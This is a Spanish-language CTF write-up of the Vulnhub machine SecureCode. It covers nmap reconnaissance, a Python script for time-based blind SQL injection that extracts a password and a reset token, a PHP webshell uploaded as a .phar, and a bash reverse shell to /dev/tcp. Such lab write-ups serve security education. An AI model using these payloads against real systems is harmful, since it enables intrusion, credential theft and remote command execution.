---
title: SecureCode | CTF Writeup - Vulnhub
date: 2024-03-11 16:40:00 +/-TTTT
categories: [PENTESTING, CTF]
tags: [vulnhub, writeup, sqli, file_upload, rce]    
---

# SecureCode

>Para la primera etapa de enumeración, primero debemos descubrir la IP de la máquina víctima.

```shell
> arp-scan -I ens33 --localnet 
Interface: ens33, type: EN10MB, MAC: 00:0c:29:85:8e:61, IPv4: 192.168.216.133
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.216.1	00:50:56:c0:00:08	VMware, Inc.
192.168.216.2	00:50:56:e2:11:a1	VMware, Inc.
192.168.216.147	00:0c:29:ab:28:72	VMware, Inc.
192.168.216.254	00:50:56:f8:e9:f9	VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.037 seconds (125.68 hosts/sec). 4 responded
```

>Vemos que está activa la IP 192.168.216.147. La exportamos a una variable para trabajar más cómodamente desde la terminal:

```shell
> export IP=192.168.216.147
```

>Ahora sí, realizamos un escaneo de puertos exhaustivo con `nmap`.

```shell
nmap -sS -T5 --min-rate 5000 -Pn -n -p- -oN scan.txt $IP
```

* `-sS`: TCP SYN Port Scan. 
* `-T5`: Modo "alocado" de `nmap`. 
* `-p-`: Parámetro para escanear todos los 65535 puertos.
* `-Pn`: No queremos que nos aplique descubrimiento de hosts mediante ping.
* `-n`: No queremos que nos aplique resolución DNS.
* `--min-rate 5000`: Queremos tramitar no menos de 5000 paquetes por segundo.
* `-oN`: Exportamos el output al archivo `scan.txt`.

```shell
# Nmap 7.93 scan initiated Thu Jan 18 00:06:42 2024 as: nmap -sS -T5 --min-rate 5000 -Pn -n -p- -oN scan.txt 192.168.216.147
Nmap scan report for 192.168.216.147
Host is up (0.00064s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:AB:28:72 (VMware)

# Nmap done at Thu Jan 18 00:06:43 2024 -- 1 IP address (1 host up) scanned in 1.10 seconds
```

>Escaneamos las versiones de los puertos y corremos scripts básicos de reconocimiento empleados nuevamente con la herramienta `nmap`. Los parámetros que usamos son los siguientes:

* `-sV`: Detecta las versiones.
* `-sC`: Aplica scripts de nmap, generalmente ubicados en la ruta `/usr/share/nmap/scripts` si usamos distribuciones de Linux como Parrot o Kali.

```shell
# Nmap 7.93 scan initiated Thu Jan 18 00:07:06 2024 as: nmap -sCV -p80 -oN versions.txt 192.168.216.147
Nmap scan report for 192.168.216.147
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Coming Soon 2
| http-robots.txt: 1 disallowed entry 
|_/login/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:AB:28:72 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 18 00:07:13 2024 -- 1 IP address (1 host up) scanned in 6.66 seconds
```

>Vemos que nos descubre un archivo `robots.txt` en la página web. 

![[Pasted image 20240121005205.png]]({%link assets/img/securecode/1.png%})

>Si vamos a la página de login y probamos poner comillas en caso de que se acontezca una SQL Injection, interceptando la petición con Burp Suite, veremos lo siguiente:

![[Pasted image 20240121005428.png]]({%link assets/img/securecode/2.png%})

>Nos copiamos la petición y corremos `sqlmap` para ver si es vulnerable.

```shell
> sqlmap -r request.txt --batch -p username
```

![[Captura de pantalla (205).png]]({%link assets/img/securecode/3.png%})

>Como vemos, no nos devuelve nada de lo que podamos aprovecharnos. Si intentamos hacer un descubrimiento de directorios y archivos en la aplicación con la herramienta `gobuster`, filtrando por distintas extensiones de archivo, nos encontraremos con algo interesante.

![[Pasted image 20240121010522.png]]({%link assets/img/securecode/4.png%})

>Encontramos un archivo `source_code.zip`. Nos lo descargamos con `wget http://$IP/source_code.zip`.
>Luego, lo descomprimimos con `unzip`.

![[Pasted image 20240121010714.png]]({%link assets/img/securecode/5.png%})

>Hay una filtración de información sensible: tenemos capacidad de leer todo el código de la página, incluida la base de datos. Si hacemos un `cat db.sql` y buscamos los usuarios válidos, vemos lo siguiente:

![[Pasted image 20240121010927.png]]({%link assets/img/securecode/6.png%})

>Las contraseñas están hasheadas. Si intentamos crackearlas offline con herramientas como Crackstation o `john`, veremos que no podremos. También vemos una columna `token`, que quizás nos podría llegar a servir para bypassear la autenticación en caso de no llegar a saber la contraseña de admin.
>Queremos examinar el código con el que se controlan las conexiones y autenticaciones a nivel de usuarios para encontrar nuestro vector de ataque. Por ello, nos dirigimos al directorio include y hacemos un `cat *` para ver todos los archivos.

![[Pasted image 20240121011418.png]]({%link assets/img/securecode/7.png%})

>Tenemos el nombre de la base de datos en uso (`hackshop`). Si seguimos examinando:

![[Pasted image 20240121011507.png]]({%link assets/img/securecode/8.png%})

>Este archivo es el responsable de redirigirnos a la página de login cuando queremos listar lo que hay en el directorio users o item. Esto se debe a que no tenemos una sesión privilegiada dentro de la aplicación.
>Seguimos examinando y nos encontramos con esto dentro del directorio `item`:

![[Pasted image 20240121011904.png]]({%link assets/img/securecode/9.png%})

>Este archivo php dentro del directorio `item` parece ser que toma un parámetro `id`. Con la función `mysqli_real_escape_string` se están escapando las comillas que se coloquen en el mismo.  Nos dirigimos al sitio web y generamos una petición GET con un número de `id` que no existe (sabemos que existen dos usuarios únicamente, dado que ya examinamos la base de datos).

![[Pasted image 20240121012237.png]]({%link assets/img/securecode/10.png%})

>La primera petición es la que hicimos a la ruta correspondiente al archivo vulnerable. Esto nos devuelve un 302 y nos redirige a la página de login. Probemos con un `id` que si exista (por ejemplo, el 1).

![[Pasted image 20240121012353.png]]({%link assets/img/securecode/11.png%})

>Esto no nos redirige, y nos devuelve un código de estado 404. Nos hace pensar en una inyección booleana. Como no se están empleando comillas para realizar la query (como vimos en el código del archivo viewItem.php), podemos simplemente colocar un payload como `id=1 and sleep(5)`.

![[Pasted image 20240121012559.png]]({%link assets/img/securecode/12.png%})

>La web tarda 5 segundos en responder. Esto es un buen indicio para poder empezar a elaborar nuestra inyección. 
>Sabemos que existen dos usuarios y que se están almacenando sus contraseñas con hashes md5, pero el archivo .zip que descomprimimos es simplemente un archivo de backup. Esto significa que, en el mejor de los casos, podemos dumpear la contraseña del usuario admin, ya que podría estar almacenándose en texto claro dentro de la base de datos de la aplicación. 

>Queremos generar un payload de modo que podamos aplicar comparativas sin colocar comillas, dado que se están escapando del lado del servidor. Para ello, podemos usar la función `ascii` de mysql. Ya sabemos el nombre de la base de datos en uso (`hackshop`), así que podemos comparar la primera letra con una h en código ASCII.

```sql
id=1 and if(ascii(substring(database(),1,1))=104,sleep(5),1)
```

![[Pasted image 20240121014842.png]]({%link assets/img/securecode/13.png%})

>Nos tarda 5 segundos en cargar la página. Esto nos indica que la comparativa es exitosa. Podemos listar la primera letra del usuario admin con la siguiente query:

![[Pasted image 20240121015716.png]]({%link assets/img/securecode/14.png%})

>Con esta misma query nos automatizaremos el proceso con un script escrito por nosotros en Python. 

```python
#!/usr/bin/env python

import sys, signal, time, requests, string
from termcolor import colored
from pwn import *
from argparse import ArgumentParser

def ctrl_c(sig,frame):
    print(colored(f"\n[!] Exiting...", "red"));
    sys.exit(1);

signal.signal(signal.SIGINT,ctrl_c);

def get_args():
    parser = ArgumentParser(description="Automatized SQL Injection");
    parser.add_argument('-c', '--column', required=True, dest="column", choices=["username", "token", "password"], help="Column to enumerate. Valid options: username, token, password");
    args = parser.parse_args().column; 
    return args;
    
def sqli(column):

    characters = string.printable; # caracteres imprimibles.
    main_url = "http://192.168.216.148/item/viewItem.php";
    creds = "";
    p1 = log.progress("SQL Injection");
    p1.status("Initiating attack...");
    p2 = log.progress("Retrieving creds...");

	# fijamos cada posición, iteramos para cada carácter hasta encontrar el correcto
	# y volvemos al bucle de posición.
    for position in range(0,100):
        for character in characters:
            payload = f"?id=1 and if( (select ascii(substring({column},{position},1)) from user where id=1)={ord(character)},sleep(1.5),1)";
            
            p1.status(payload);

            t1 = time.time();

            r = requests.get(main_url + payload);

            t2 = time.time();

            if (t2 - t1 > 1.5): # si t2 es mayor a t1, es porque la web tardó en responder.
                creds += character;
                p2.status(creds);
                break;

if __name__ == "__main__":
    column = get_args()
    sqli(column)
```

>Ejecutamos nuestro script con el comando `python3 exploit.py -c password`

![[Pasted image 20240121021909.png]]({%link assets/img/securecode/15.png%})

>Interesante. Si intentamos iniciar sesión como admin con la contraseña proporcionada:

![[Pasted image 20240121021944.png]]({%link assets/img/securecode/16.png%})

>La contraseña resulta un tanto peculiar. Nos está dando una pista que debemos cambiarla. Si nos vamos a la parte del código encargada del cambio de contraseña (/login/resetPassword.php), vemos lo siguiente:

![[Pasted image 20240121022401.png]]({%link assets/img/securecode/18.png%})

>Está generando el token y colocándolo en la base de datos. Por ello, añadimos la opción de enumerar el token en nuestro script de Python.

![[Pasted image 20240121022533.png]]({%link assets/img/securecode/17.png%})

>También vemos que se tramita el cambio de contraseña proporcionando el token por una petición GET a la URL especificada. Nos vamos a generar una nueva contraseña dentro de la página, clickeando en `Forgot Your Password?` y nos ejecutamos nuestro script con el comando `python3 exploit.py -c token`.

![[Pasted image 20240121022833.png]]({%link assets/img/securecode/19.png%})

>Lo pegamos en la URL para efectuar el cambio de contraseña.

![[Pasted image 20240121022906.png]]({%link assets/img/securecode/20.png%})

>Iniciamos sesión y vemos un listado de usuarios.

![[Pasted image 20240121022944.png]]({%link assets/img/securecode/21.png%})

>También vemos una sección Items. Vamos a enumerarla.

![[Pasted image 20240121023019.png]]({%link assets/img/securecode/22.png%})

>Podemos añadir items nuevos. Estos incluyen un archivo. Tenemos una mayor superficie de ataque ahora que estamos como administradores en la página, y queremos ver si se acontece una vulnerabilidad en la subida de archivos. Subimos nuestro archivo `webshell.php` y lo interceptamos con Burp Suite.

```php
<pre>
<?php
	echo system($_GET["cmd"]);
?>
</pre>
```

![[Pasted image 20240121023428.png]]({%link assets/img/securecode/23.png%})

>Si vamos a Burp, vemos que se está enviando la siguiente petición.

![[Pasted image 20240121023509.png]]({%link assets/img/securecode/24.png%})

>Lo mandamos al Repeater y vemos la respuesta en mayor detalle.

![[Pasted image 20240121023548.png]]({%link assets/img/securecode/25.png%})

>Si inspeccionamos el archivo newFile.php del código que nos descargamos, tenemos una blacklist de extensiones así como una limitación en el Content-Type del archivo.

![[Pasted image 20240121023848.png]]({%link assets/img/securecode/26.png%})

>Si intentamos bypassearlo cambiando la extensión a `.phar` y el Content-Type a `image/gif`, añadiendo además el file signature de los archivos `.gif` (GIF8;) al principio del archivo, igual no nos dejará subirlo.

![[Pasted image 20240121024142.png]]({%link assets/img/securecode/27.png%})

>Pese a los intentos fallidos, podemos fijarnos en el archivo updateItem.php para la actualización de items previamente subidos a la plataforma con la esperanza de ver menos filtros a la hora de subir nuestro archivo malicioso.

![[Pasted image 20240121024520.png]]({%link assets/img/securecode/28.png%})

>No se están verificando los mime types. Genial. Podemos subir nuestro archivo `.phar` a un item cualquiera.

![[Pasted image 20240121024645.png]]({%link assets/img/securecode/29.png%})

![[Pasted image 20240121024649.png]]({%link assets/img/securecode/30.png%})

>¡Listo! Ahora solo queda ver dónde se está almacenando el archivo.

![[Pasted image 20240121024811.png]]({%link assets/img/securecode/31.png%})

>Dado que podemos ejecutar comandos, nos ponemos en escucha por cualquier puerto en nuestra máquina con `nc -lnvp {PORT}` y hacemos un curl a la página con el siguiente comando:

```shell
> curl -s -X GET "http://$IP/item/image/webshell.phar?cmd=bash -c 'bash -i >%26 /dev/tcp/{HOST}/{PORT} 0>%261'"
```

>Ya ganamos acceso a la máquina. Vemos la segunda flag.

![[Pasted image 20240121025112.png]]({%link assets/img/securecode/32.png%})
